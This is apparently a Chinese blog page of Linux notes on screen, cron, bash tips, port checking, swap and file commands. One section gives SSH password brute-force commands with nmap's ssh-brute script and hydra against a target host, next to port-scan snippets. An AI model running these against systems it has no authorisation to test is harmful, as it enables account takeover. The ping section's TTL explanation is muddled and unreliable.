<p>安装 Linux screen<br>现在大多数 Linux 发行版上已经预装了 screen 包。您可以通过键入以下内容来检查系统上是否安装了它：<br>linuxidc@linuxidc:~/<a href="http://www.linuxidc.com$" target="_blank" rel="noopener">www.linuxidc.com$</a> screen –version<br>Screen version 4.06.02 (GNU) 23-Oct-17<br>如果您的系统上没有安装 screen ，则可以使用发行版的软件包管理器轻松安装。</p>
<p>在 Ubuntu 和 Debian 上安装 screen<br>linuxidc@linuxidc:~/<a href="http://www.linuxidc.com$" target="_blank" rel="noopener">www.linuxidc.com$</a> sudo apt install screen</p>
<p>在 CentOS 和 Fedora 上安装 screen<br>linuxidc@linuxidc:~/<a href="http://www.linuxidc.com$" target="_blank" rel="noopener">www.linuxidc.com$</a> sudo yum install screen</p>
<p>启动 Linux screen<br>要启动 screen 会话，只需在控制台键入 screen ：<br>screen<br>这将打开一个 screen 会话，创建一个新窗口并在该窗口中启动一个 shell。</p>
<p>现在您已经打开了一个 screen 会话，您可以通过输入以下命令获取命令列表：<br>Ctrl+a ?</p>
<h3 id="命名会话"><a href="#命名会话" class="headerlink" title="命名会话"></a>命名会话</h3><p>运行多个 screen 会话时，命名会话非常有用。要创建命名会话，请使用以下参数运行 screen 命令：<br><code>screen -S session_name</code><br>选择描述性有意义的会话名称总是一个好主意。</p>
<p>使用 Linux Screen 窗口<br>默认情况下，当您启动新的 screen 会话时，它会创建一个包含 shell 的单个窗口。<br>您可以在 screen 会话中拥有多个窗口。<br>要创建一个有 shell 的新窗口请键入 Ctrl+a c ，将为其分配范围 0…9 中的第一个可用编号。<br>以下是一些用于管理 Linux Screen 窗口 的</p>
<h3 id="最常用命令："><a href="#最常用命令：" class="headerlink" title="最常用命令："></a>最常用命令：</h3><p>Ctrl+a c 创建一个新窗口（带shell）<br>Ctrl+a “ 列出所有窗口<br>Ctrl+a 0 切换到窗口 0（按编号）<br>Ctrl+a A 重命名当前窗口<br>Ctrl+a S 将当前区域水平分割为两个区域<br>Ctrl+a | 将当前区域垂直分成两个区域<br>Ctrl+a tab 将输入焦点切换到下一个区域<br>Ctrl+a Ctrl+a 在当前和之前的区域之间切换<br>Ctrl+a Q 关闭除当前区域之外其他所有区域<br>Ctrl+a X 关闭当前区域<br>从 Linux screen 会话中分离出来</p>
<p>您可以通过键入以下内容随时从 screen 会话中分离：<br><code>Ctrl+a d</code><br>从会话中分离后，在 screen 会话中运行的程序将继续运行。</p>
<p>重新连接到 Linux screen</p>
<p>要恢复 screen 会话，请使用以下命令：</p>
<p><code>screen -r</code></p>
<p>如果您的计算机上运行了多个 screen 会话，则需要在 r 后附加 screen 会话 ID 。<br>要查找 screen 会话 ID，可以使用如下命令列出当前运行的列表：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linuxidc@linuxidc:~/www.linuxidc.com$ screen -ls</span><br><span class="line">There are screens on:</span><br><span class="line"></span><br><span class="line">15174.session_name      (08/13/2019 09:19:34 PM)        (Attached)</span><br><span class="line">12475.pts-0.linuxidc    (08/13/2019 09:16:31 PM)        (Attached)</span><br><span class="line">12230.pts-0.linuxidc    (08/13/2019 09:15:42 PM)        (Detached)</span><br></pre></td></tr></table></figure></p>
<p>Sockets in /run/screen/S-linuxidc.</p>
<p>如果要还原 12475.pts-0 ，请键入以下命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linuxidc@linuxidc:~/www.linuxidc.com$ screen -r 12475</span><br><span class="line">There is a screen on:</span><br><span class="line"></span><br><span class="line">12475.pts-0.linuxidc    (08/13/2019 09:16:32 PM)        (Attached)</span><br><span class="line"></span><br><span class="line">There is no screen to be resumed matching 12475.</span><br></pre></td></tr></table></figure></p>
<p>自定义 Linux screen<br>如果 /etc/screenrc 和 ~/.screenrc 文件存在，当 screen 启动时从中读取它的配置参数。我们可以通过 .screenrc 文件根据我们自己的偏好修改默认 screen 设置。<br>以下是一个示例 ~/.screenrc配置， 有自定义状态行和几个附加选项：<br>〜/.screenrc</p>
<h2 id="ping-命令"><a href="#ping-命令" class="headerlink" title="ping 命令"></a>ping 命令</h2><p>bytes值：数据包大小，也就是字节。<br>time值：响应时间，这个时间越小，说明你连接这个地址速度越快。<br>TTL值：Time To Live,表示DNS记录在DNS服务器上存在的时间，它是IP协议包的一个值，告诉路由器该数据包何时需要被丢弃。可以通过Ping返回的TTL值大小，粗略地判断目标系统类型是Windows系列还是UNIX/Linux系列。</p>
<p>因此一般TTL值：<br>100~130ms之间，Windows系统 ；<br>240~255ms之间，UNIX/Linux系统。</p>
<p><img data-src="http://tuchuang.xchcloud.cn/blog/20200302/yFEBO0nePwNn.png?imageslim" alt="mark"></p>
<p>ping -r count 的使用</p>
<p><code>ping -n 1 -r 9 202.102.224.25 （发送一个数据包，最多记录9个路由）</code></p>
<p>批量Ping网段</p>
<p><code>for /L %D in (1,1,255) do ping 10.168.1.%D</code></p>
<p>代码中的这个(1,1,255)就是网段起与始，就是检测网段192.168.1.1到192.168.1.255之间的所有的ip地址，每次逐增1，直接到1到255这255个ip检测完为止。</p>
<h2 id="cron-表达式"><a href="#cron-表达式" class="headerlink" title="cron 表达式"></a>cron 表达式</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我们经常使用 cron 表达式来定义定时任务的执行策略，今天我们就总结一下 cron 表达式的一些相关知识。</p>
<h3 id="cron-表达式的定义"><a href="#cron-表达式的定义" class="headerlink" title="cron 表达式的定义"></a>cron 表达式的定义</h3><p>cron 表达式是一个字符串，该字符串由 6 个空格分为 7 个域，每一个域代表一个时间单位。格式如下：</p>
<p> [秒] [分] [时] [日] [月] [周] [年]<br>通常定义 “年” 的部分可以省略，实际常用的由 前六部分组成</p>
<h4 id="cron-各部定义"><a href="#cron-各部定义" class="headerlink" title="cron 各部定义"></a>cron 各部定义</h4><p>关于 cron 的各个域的定义如下表格所示：<br>| 域 | 是否必填 | 值以及范围      | 通配符        |<br>|—-|———-|—————–|—————|<br>| 秒 | 是       | 0-59            | , - <em> /       |<br>| 分 | 是       | 0-59            | , - </em> /       |<br>| 时 | 是       | 0-23            | , - <em> /       |<br>| 日 | 是       | 1-31            | , - </em> ? / L W |<br>| 月 | 是       | 1-12 或 JAN-DEC | , - <em> /       |<br>| 周 | 是       | 1-7 或 SUN-SAT  | , - </em> ? / L # |<br>| 年 | 否       | 1970-2099       | , - * /       |</p>
<p>上面列表中值范围还是比较好理解的，但是比较令开发者难以理解的就是通配符，其实 cron 表达式的难点也在于通配符。我们在下一个章节进行说明</p>
<h4 id="cron-中的通配符"><a href="#cron-中的通配符" class="headerlink" title="cron 中的通配符"></a>cron 中的通配符</h4><p>, 这里指的是在两个以上的时间点中都执行，如果我们在 “分” 这个域中定义为 8,12,35 ，则表示分别在第 8 分，第 12 分 第 35 分执行该定时任务。</p>
<ul>
<li>这个比较好理解就是指定在某个域的连续范围，如果我们在 “时” 这个域中定义 1-6，则表示在 1 到 6 点之间每小时都触发一次，用 , 表示 1,2,3,4,5,6</li>
</ul>
<ul>
<li>表示所有值，可解读为 “每”。如果在“日”这个域中设置 <em>,表示每一天都会触发。<br>? 表示不指定值。使用的场景为不需要关心当前设置这个字段的值。例如:要在每月的 8 号触发一个操作，但不关心是周几，我们可以这么设置 0 0 0 8 </em> ?<br>/ 在某个域上周期性触发，该符号将其所在域中的表达式分为两个部分，其中第一部分是起始值，除了秒以外都会降低一个单位，比如 在 “秒” 上定义 5/10 表示从 第 5 秒开始 每 10 秒执行一次，而在 “分” 上则表示从 第 5 秒开始 每 10 分钟执行一次。<br>L 表示英文中的LAST 的意思，只能在 “日”和“周”中使用。在“日”中设置，表示当月的最后一天(依据当前月份，如果是二月还会依据是否是润年), 在“周”上表示周六，相当于”7”或”SAT”。如果在”L”前加上数字，则表示该数据的最后一个。例如在“周”中设置”7L”这样的格式,则表示“本月最后一个周六”<br>W 表示离指定日期的最近那个工作日(周一至周五)触发，只能在 “日” 中使用且只能用在具体的数字之后。若在“日”上设置”15W”，表示离每月 15 号最近的那个工作日触发。假如 15 号正好是周六，则找最近的周五(14 号)触发, 如果 15 号是周未，则找最近的下周一(16 号)触发.如果 15 号正好在工作日(周一至周五)，则就在该天触发。如果是 “1W” 就只能往本月的下一个最近的工作日推不能跨月往上一个月推。<br>“#”表示每月的第几个周几，只能作用于 “周” 。例如 ”2#3” 表示在每月的第三个周二。</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>下面给出一些示例，可根据上面的解释进行练习解读：</p>
<p>每隔 1 分钟执行一次：0 <em>/1 </em> <em> </em> ?<br>每天 23 点执行一次：0 0 23 <em> </em> ?<br>每月 1 号凌晨 1 点执行一次：0 0 1 1 <em> ?<br>每月最后一天 23 点执行一次：0 0 23 L </em> ?<br>每周星期天凌晨 1 点实行一次：0 0 1 ? <em> L<br>在 26 分、29 分、33 分执行一次：0 26,29,33 </em> <em> </em> ?</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天总结了 cron 表达式，希望对你日常开发有所帮助。其实我们还可以借助于一些可视化的工具来生成 cron 表达式，但是如果我们同样需要能够看得懂别人写的表达式。多多关注！更多干货尽在 felord.cn[1]。</p>
<h2 id="Linux下有哪些特殊文件"><a href="#Linux下有哪些特殊文件" class="headerlink" title="Linux下有哪些特殊文件"></a>Linux下有哪些特殊文件</h2><h3 id="普通文件"><a href="#普通文件" class="headerlink" title="普通文件"></a>普通文件</h3><p>d    目录<br>l 符号链接<br>s    套接字<br>b    块设备<br>c    字符设备<br>p    管道</p>
<h3 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h3><p>可无限接收数据，你可以认为是一个黑洞，因此如果我们需要丢弃某些终端输出，可以重定向到这里：</p>
<h3 id="dev-full"><a href="#dev-full" class="headerlink" title="/dev/full"></a>/dev/full</h3><p>它在读取时会读取到连续的NUL（零值）字节流，而在写入的时候，会返回磁盘空间已满的结果。</p>
<h3 id="dev-zero"><a href="#dev-zero" class="headerlink" title="/dev/zero"></a>/dev/zero</h3><p>和/dev/null类似，向其中写入时会丢弃所有数据，但是读取时，会产生NUL（零值）字节流。</p>
<h3 id="dev-random"><a href="#dev-random" class="headerlink" title="/dev/random"></a>/dev/random</h3><p>/dev/random可以提供随机数据流，它保证数据的随机性，但是读取时会造成等待。</p>
<h3 id="dev-urandom"><a href="#dev-urandom" class="headerlink" title="/dev/urandom"></a>/dev/urandom</h3><p>从名字就可以看出来，是用来产生随机数据的。它的产生速度很快，但是数据的随机性不如/dev/random。</p>
<h3 id="dev-pts"><a href="#dev-pts" class="headerlink" title="/dev/pts"></a>/dev/pts</h3><p>/dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。<br>举个例子，你打开一个终端，获取到当前的pts：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/0</span><br></pre></td></tr></table></figure></p>
<p>然后你又打开一个，输入：<br><code>$ echo &quot;hahahaha&quot;&gt;/dev/pts/0</code><br>你就会发现内容被打印到前面一个终端了。<br>通常我们运行一个程序，其printf的打印都会打印在当前终端。</p>
<h2 id="小故事"><a href="#小故事" class="headerlink" title="小故事"></a>小故事</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/MgIu1gO1OS77.png?imageslim" alt="mark"></p>
<h2 id="Linux编写Bash脚本的10个技巧"><a href="#Linux编写Bash脚本的10个技巧" class="headerlink" title="Linux编写Bash脚本的10个技巧"></a>Linux编写Bash脚本的10个技巧</h2><p>Shell 脚本编程 是你在 Linux 下学习或练习编程的最简单的方式。尤其对 系统管理员要处理着自动化任务，且要开发新的简单的实用程序或工具等（这里只是仅举几例）更是必备技能。<br>本文中，我们将分享 10 个写出高效可靠的 bash 脚本的实用技巧，它们包括：</p>
<h3 id="1、-脚本中多写注释"><a href="#1、-脚本中多写注释" class="headerlink" title="1、 脚本中多写注释"></a>1、 脚本中多写注释</h3><p>这是不仅可应用于 shell 脚本程序中，也可用在其他所有类型的编程中的一种推荐做法。在脚本中作注释能帮你或别人翻阅你的脚本时了解脚本的不同部分所做的工作。<br>对于刚入门的人来说，注释用 # 号来定义。<br>TecMint 是浏览各类 Linux 文章的最佳站点</p>
<h3 id="2、-当运行失败时使脚本退出"><a href="#2、-当运行失败时使脚本退出" class="headerlink" title="2、 当运行失败时使脚本退出"></a>2、 当运行失败时使脚本退出</h3><p>有时即使某些命令运行失败，bash 可能继续去执行脚本，这样就影响到脚本的其余部分（会最终导致逻辑错误）。用下面的行的方式在遇到命令失败时来退出脚本执行：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/LbkGJyIvNTiG.png" alt="mark"></p>
<h3 id="3、-当-Bash-用未声明变量时使脚本退出"><a href="#3、-当-Bash-用未声明变量时使脚本退出" class="headerlink" title="3、 当 Bash 用未声明变量时使脚本退出"></a>3、 当 Bash 用未声明变量时使脚本退出</h3><p>Bash 也可能会使用能导致起逻辑错误的未声明的变量。因此用下面行的方式去通知 bash 当它尝试去用一个未声明变量时就退出脚本执行：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/qdi5OMQO9Hkb.png" alt="mark"></p>
<h3 id="4、-使用双引号来引用变量"><a href="#4、-使用双引号来引用变量" class="headerlink" title="4、 使用双引号来引用变量"></a>4、 使用双引号来引用变量</h3><p>当引用时（使用一个变量的值）用双引号有助于防止由于空格导致单词分割开和由于识别和扩展了通配符而导致的不必要匹配。<br>看看下面的例子：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/807Xe5NEaxv8.png" alt="mark"><br>保存文件并退出，接着如下运行一下：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/3UFI4OELVtfd.png" alt="mark"><br>$ ./names.sh<br>在脚本中用双引号</p>
<h3 id="5、-在脚本中使用函数"><a href="#5、-在脚本中使用函数" class="headerlink" title="5、 在脚本中使用函数"></a>5、 在脚本中使用函数</h3><p>除了非常小的脚本（只有几行代码），总是记得用函数来使代码模块化且使得脚本更可读和可重用。<br>写函数的语法如下所示：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/4xXl0yMR0XrC.png" alt="mark"><br>写成单行代码时，每个命令后要用终止符号：<br>check_root(){ command1; command2; }​</p>
<h3 id="6、-字符串比较时用-而不是"><a href="#6、-字符串比较时用-而不是" class="headerlink" title="6、 字符串比较时用 = 而不是 =="></a>6、 字符串比较时用 = 而不是 ==</h3><p>注意 == 是 = 的同义词，因此仅用个单 = 来做字符串比较，例如：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/YDbPomQiRhIS.png" alt="mark"><br>Linux 中高效编写 Bash 脚本的 10 个技巧</p>
<h3 id="7、-用-command-而不是老旧的-command-来做代换"><a href="#7、-用-command-而不是老旧的-command-来做代换" class="headerlink" title="7、 用 \$(command) 而不是老旧的 command 来做代换"></a>7、 用 \$(command) 而不是老旧的 command 来做代换</h3><p>命令代换 是用这个命令的输出结果取代命令本身。用 \$(command) 而不是引号 command 来做命令代换。<br>这种做法也是 shellcheck tool （可针对 shell 脚本显示警告和建议）所建议的。例如：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/DYe3wFENOk7w.png" alt="mark"></p>
<h3 id="8、-用-readonly-来声明静态变量"><a href="#8、-用-readonly-来声明静态变量" class="headerlink" title="8、 用 readonly 来声明静态变量"></a>8、 用 readonly 来声明静态变量</h3><p>静态变量不会改变；它的值一旦在脚本中定义后不能被修改：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/iXT076UKc4QB.png" alt="mark"></p>
<h3 id="9、-环境变量用大写字母命名，而自定义变量用小写"><a href="#9、-环境变量用大写字母命名，而自定义变量用小写" class="headerlink" title="9、 环境变量用大写字母命名，而自定义变量用小写"></a>9、 环境变量用大写字母命名，而自定义变量用小写</h3><p>所有的 bash 环境变量用大写字母去命名，因此用小写字母来命名你的自定义变量以避免变量名冲突：<br><img data-src="http://tuchuang.xchcloud.cn/blog/20200303/aAncwqWDcf5E.png" alt="mark"></p>
<h3 id="10、-总是对长脚本进行调试"><a href="#10、-总是对长脚本进行调试" class="headerlink" title="10、 总是对长脚本进行调试"></a>10、 总是对长脚本进行调试</h3><p>如果你在写有数千行代码的 bash 脚本，排错可能变成噩梦。为了在脚本执行前易于修正一些错误，要进行一些调试。后续会更新一篇指南来让大家掌握这些技巧：<br>如何在 Linux 中启用 Shell 脚本调试模式<br>如何在 Shell 脚本中执行语法检查调试模式<br>如何在 Shell 脚本中跟踪调试命令的执行​​​​</p>
<h2 id="检查开放端口"><a href="#检查开放端口" class="headerlink" title="检查开放端口"></a>检查开放端口</h2><h3 id="使用-Nmap-命令检查开放端口"><a href="#使用-Nmap-命令检查开放端口" class="headerlink" title="使用 Nmap 命令检查开放端口"></a>使用 Nmap 命令检查开放端口</h3><p>Nmap 是端口扫描的首选工具。除端口扫描外，Nmap 还可以检测 Mac 地址、操作系统类型、内核版本等。</p>
<p>从控制台发出以下命令确定哪些端口正在监听来自网络的 TCP 连接：</p>
<p><code>$ sudo nmap -sT -p- 10.10.8.8</code><br>-sT 选项告诉 Nmap 扫描 TCP 端口， -p- 扫描所有端口（65535 个）。如果不使用 -p-，Nmap 将仅扫描 1000 个端口。</p>
<p><code>$ sudo nmap -sU -p- 10.10.8.8</code><br>要扫描 UDP 端口，请使用 -sU 代替 -sT：</p>
<h3 id="使用-Netcat-命令检查开放端口"><a href="#使用-Netcat-命令检查开放端口" class="headerlink" title="使用 Netcat 命令检查开放端口"></a>使用 Netcat 命令检查开放端口</h3><p>使用 netcat 可以扫描单个端口或端口范围。</p>
<p><code>$ nc -z -v 10.10.8.8 20-80</code><br>-z 选项指示 nc 仅扫描打开的端口，而不发送任何数据，并且 -v 用于获取更多详细信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">nc: connect to 10.10.8.8 port 20 (tcp) failed: Connection refused</span><br><span class="line">nc: connect to 10.10.8.8 port 21 (tcp) failed: Connection refused</span><br><span class="line">Connection to 10.10.8.8 22 port [tcp/ssh] succeeded!</span><br><span class="line">...</span><br><span class="line">Connection to 10.10.8.8 80 port [tcp/http] succeeded!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ nc -z -v 10.10.8.8 20-80 2&gt;&amp;1 | grep succeeded</span><br><span class="line">Connection to 10.10.8.8 22 port [tcp/ssh] succeeded!</span><br><span class="line">Connection to 10.10.8.8 80 port [tcp/http] succeeded!</span><br></pre></td></tr></table></figure>
<p><code>$ nc -z -v -u 10.10.8.8 20-80 2&gt;&amp;1 | grep succeeded</code><br>要扫描 UDP 端口，请将 -u 选项传递给 nc 命令</p>
<h3 id="使用-Bash-伪设备检查打开的端口"><a href="#使用-Bash-伪设备检查打开的端口" class="headerlink" title="使用 Bash 伪设备检查打开的端口"></a>使用 Bash 伪设备检查打开的端口</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if timeout 5 bash -c &apos;&lt;/dev/tcp/kernel.org/443 &amp;&gt;/dev/null&apos;</span><br><span class="line">then</span><br><span class="line">  echo &quot;Port is open&quot;</span><br><span class="line">else</span><br><span class="line">  echo &quot;Port is closed&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for PORT in &#123;20..80&#125;; do</span><br><span class="line">  timeout 1 bash -c &quot;&lt;/dev/tcp/10.10.8.8/$PORT &amp;&gt;/dev/null&quot; &amp;&amp;  echo &quot;port $PORT is open&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h2 id="优雅地修正命令"><a href="#优雅地修正命令" class="headerlink" title="优雅地修正命令"></a>优雅地修正命令</h2><h3 id="移动光标到命令开头"><a href="#移动光标到命令开头" class="headerlink" title="移动光标到命令开头"></a>移动光标到命令开头</h3><p>ctrl + a   / home</p>
<h3 id="移动光标到命令结尾"><a href="#移动光标到命令结尾" class="headerlink" title="移动光标到命令结尾"></a>移动光标到命令结尾</h3><p>ctrl+e    /end</p>
<h3 id="向前移动一个词"><a href="#向前移动一个词" class="headerlink" title="向前移动一个词"></a>向前移动一个词</h3><p>alt+f</p>
<h3 id="向后移动一个词"><a href="#向后移动一个词" class="headerlink" title="向后移动一个词"></a>向后移动一个词</h3><p>alt+b</p>
<h3 id="清空整条命令"><a href="#清空整条命令" class="headerlink" title="清空整条命令"></a>清空整条命令</h3><p>ctrl +u</p>
<h3 id="删除命令的一个词"><a href="#删除命令的一个词" class="headerlink" title="删除命令的一个词"></a>删除命令的一个词</h3><p>ctrl+w</p>
<h3 id="将词转换为大写"><a href="#将词转换为大写" class="headerlink" title="将词转换为大写"></a>将词转换为大写</h3><p>esc + u</p>
<h3 id="将词转换为小写"><a href="#将词转换为小写" class="headerlink" title="将词转换为小写"></a>将词转换为小写</h3><p>esc + l</p>
<h3 id="the-fuck-神器"><a href="#the-fuck-神器" class="headerlink" title="the fuck 神器"></a>the fuck 神器</h3><h2 id="账号密码暴力破解"><a href="#账号密码暴力破解" class="headerlink" title="账号密码暴力破解"></a>账号密码暴力破解</h2><h3 id="使用nmap爆破"><a href="#使用nmap爆破" class="headerlink" title="使用nmap爆破"></a>使用nmap爆破</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 22 --script=ssh-brute --script-args </span><br><span class="line">userdb=用户字典</span><br><span class="line">passdb=密码字典 </span><br><span class="line">目标机ip</span><br></pre></td></tr></table></figure>
<h3 id="使用hydra爆破"><a href="#使用hydra爆破" class="headerlink" title="使用hydra爆破"></a>使用hydra爆破</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l root -P ssh_password.txt 目标机ip ssh  -v</span><br><span class="line">其中-l 指定用户名，可以使用-L指定用户名字典文件；</span><br><span class="line">-p指定密码，-P指定密码字典文件;</span><br><span class="line">-v显示详细的执行过程。</span><br></pre></td></tr></table></figure>
<p>简单比较一下：<br>1、hydra使用起来更灵活。在已知用户名的情况下，使用hydra会更方便一些。<br>2、两个工具都不止于爆破ssh密码，nmap还能扫描网络，hydra还能爆破表单等。</p>
<h2 id="Swep-虚拟内存交换空间"><a href="#Swep-虚拟内存交换空间" class="headerlink" title="Swep 虚拟内存交换空间"></a>Swep 虚拟内存交换空间</h2><p><a href="http://www.hug-code.cn/article/1115.shtml" target="_blank" rel="noopener">Linux 添加 Swp 虚拟内存交换空间</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、新建磁盘分区作为swap分区</span><br><span class="line">1.以root身份进入控制台（登录系统），输入</span><br><span class="line"># swapoff -a #停止所有的swap分区</span><br><span class="line">2. 用fdisk命令（例：# fdisk /dev/sdb）对磁盘进行分区，添加swap分区，新建分区，在fdisk中用“t”命令将新添的分区id改为82（Linux swap类型），最后用w将操作实际写入硬盘（没用w之前的操作是无效的）。</span><br><span class="line">3. # mkswap /dev/sdb2 #格式化swap分区，这里的sdb2要看您加完后p命令显示的实际分区设备名</span><br><span class="line">4. # swapon /dev/sdb2 #启动新的swap分区</span><br><span class="line">5. 为了让系统启动时能自动启用这个交换分区，可以编辑/etc/fstab,加入下面一行</span><br><span class="line">/dev/sdb2 swap swap defaults 0 0</span><br><span class="line"></span><br><span class="line">二、用文件作为Swap分区</span><br><span class="line">1.创建要作为swap分区的文件:增加1GB大小的交换分区，则命令写法如下，其中的count等于想要的块的数量（bs*count=文件大小）。</span><br><span class="line"># dd if=/dev/zero of=/root/swapfile bs=1M count=4096</span><br><span class="line">2.格式化为交换分区文件:</span><br><span class="line"># mkswap /root/swapfile #建立swap的文件系统</span><br><span class="line">3.启用交换分区文件:</span><br><span class="line"># swapon /root/swapfile #启用swap文件</span><br><span class="line">4.使系统开机时自启用，在文件/etc/fstab中添加一行：</span><br><span class="line">/root/swapfile swap swap defaults 0 0</span><br><span class="line"></span><br><span class="line">停止使用交换分区</span><br><span class="line">通过使用 swapoff 命令停止使用交换分区，停止后可直接通过rm -f命令删除交换文件。</span><br><span class="line">swapoff /home/swap</span><br></pre></td></tr></table></figure></p>
<h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -name filename.txt 根据名称查找/目录下的filename.txt文件。</span><br><span class="line">find . -name &quot;*.xml&quot; 递归查找所有的xml文件</span><br><span class="line"></span><br><span class="line">find . -name &quot;*.xml&quot; |xargs grep &quot;hello world&quot; 递归查找所有文件内容中包含hello world的xml文件</span><br><span class="line"></span><br><span class="line">grep -H &apos;spring&apos; *.xml 查找所以有的包含spring的xml文件</span><br><span class="line"></span><br><span class="line">find ./ -size 0 | xargs rm -f &amp; 删除文件大小为零的文件</span><br><span class="line"></span><br><span class="line">ls -l | grep &apos;.jar&apos; 查找当前目录中的所有jar文件</span><br><span class="line"></span><br><span class="line">grep &apos;test&apos; d* 显示所有以d开头的文件中包含test的行。</span><br><span class="line"></span><br><span class="line">grep &apos;test&apos; aa bb cc 显示在aa，bb，cc文件中匹配test的行。</span><br><span class="line"></span><br><span class="line">grep &apos;[a-z]\&#123;5\&#125;&apos; aa 显示所有包含每个字符串至少有5个连续小写字符的字符串的行。</span><br></pre></td></tr></table></figure>
<h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>查看文件头10行<br>head -n 10 example.txt</p>
<p>查看文件尾10行<br>tail -n 10 example.txt</p>
<p>查看日志类型文件<br>tail -f exmaple.log 这个命令会自动显示新增内容，屏幕只显示10行内容的（可设置）。</p>
<h2 id="查找应用-进程"><a href="#查找应用-进程" class="headerlink" title="查找应用/进程"></a>查找应用/进程</h2><p>查看端口占用情况<br>netstat -tln | grep 8080 查看端口8080的使用情况</p>
<p>查看端口属于哪个程序<br>lsof -i :8080</p>
<p>查看进程<br>ps aux|grep java 查看java进程<br>ps aux 查看所有进程</p>
<h2 id="grep、egrep、fgrep"><a href="#grep、egrep、fgrep" class="headerlink" title="grep、egrep、fgrep"></a>grep、egrep、fgrep</h2><h2 id="awk、gawk"><a href="#awk、gawk" class="headerlink" title="awk、gawk"></a>awk、gawk</h2><h2 id="mkfs、mkdir、mkfs"><a href="#mkfs、mkdir、mkfs" class="headerlink" title="mkfs、mkdir、mkfs"></a>mkfs、mkdir、mkfs</h2><h2 id="sed、seq"><a href="#sed、seq" class="headerlink" title="sed、seq"></a>sed、seq</h2><h2 id="Linux下用ls和du命令查看文件以及文件夹大小"><a href="#Linux下用ls和du命令查看文件以及文件夹大小" class="headerlink" title="Linux下用ls和du命令查看文件以及文件夹大小"></a>Linux下用ls和du命令查看文件以及文件夹大小</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l |grep &quot;^-&quot;|wc -l或find ./company -type f | wc -l  查看某文件夹下文件的个数，包括子文件夹里的。</span><br><span class="line"></span><br><span class="line">ls -lR|grep &quot;^-&quot;|wc -l   查看某文件夹下文件夹的个数，包括子文件夹里的。</span><br><span class="line"></span><br><span class="line">ls -lR|grep &quot;^d&quot;|wc -l </span><br><span class="line"></span><br><span class="line">说明：ls -l  长列表输出该目录下文件信息(注意这里的文件，不同于一般的文件，可能是目录、链接、设备文件等)</span><br><span class="line"></span><br><span class="line">grep &quot;^-&quot;  这里将长列表输出信息过滤一部分，只保留一般文件，如果只保留目录就是 ^d</span><br><span class="line"></span><br><span class="line">wc -l 统计输出信息的行数，因为已经过滤得只剩一般文件了，所以统计结果就是一般文件信息的行数，又由于一行信息对应一个文件，所以也就是文件的个数。 </span><br><span class="line"></span><br><span class="line">du常用的选项：</span><br><span class="line">　　-h：以人类可读的方式显示</span><br><span class="line">　　-a：显示目录占用的磁盘空间大小，还要显示其下目录和文件占用磁盘空间的大小</span><br><span class="line">　　-s：显示目录占用的磁盘空间大小，不要显示其下子目录和文件占用的磁盘空间大小</span><br><span class="line">　　-c：显示几个目录或文件占用的磁盘空间大小，还要统计它们的总和</span><br><span class="line">　　--apparent-size：显示目录或文件自身的大小</span><br><span class="line">　　-l ：统计硬链接占用磁盘空间的大小</span><br><span class="line">　　-L：统计符号链接所指向的文件占用的磁盘空间大小　</span><br><span class="line">　</span><br><span class="line">du -sh : 查看当前目录总共占的容量。而不单独列出各子项占用的容量 </span><br><span class="line">du -lh --max-depth=1 : 查看当前目录下一级子文件和子目录占用的磁盘容量。</span><br><span class="line">du -sh * | sort -n 统计当前文件夹(目录)大小，并按文件大小排序</span><br><span class="line">du -sk filename 查看指定文件大小</span><br></pre></td></tr></table></figure>
<h2 id="查看Linux服务器的硬盘使用情况"><a href="#查看Linux服务器的硬盘使用情况" class="headerlink" title="查看Linux服务器的硬盘使用情况"></a>查看Linux服务器的硬盘使用情况</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）查看硬盘及分区信息，如下：</span><br><span class="line">fdisk －l</span><br><span class="line">2）检查文件系统的磁盘空间占用情况，如下</span><br><span class="line">df －h</span><br><span class="line">3）查看硬盘的I／O性能：如下</span><br><span class="line">iostat -d -x - k 1 10</span><br><span class="line">其中，iostat是含在套装sysstat中的，在centos下可以用命令 yum -y install sysstat来安装，通过如下命令查看iostat的返回结果，以我的生产环境下的MySql数据库为例说明：</span><br><span class="line">iostat -d -x -k 1 5</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>曹大的年终福利课</title>
    <url>/%E6%9B%B9%E5%A4%A7%E7%9A%84%E5%B9%B4%E7%BB%88%E7%A6%8F%E5%88%A9%E8%AF%BE/</url>
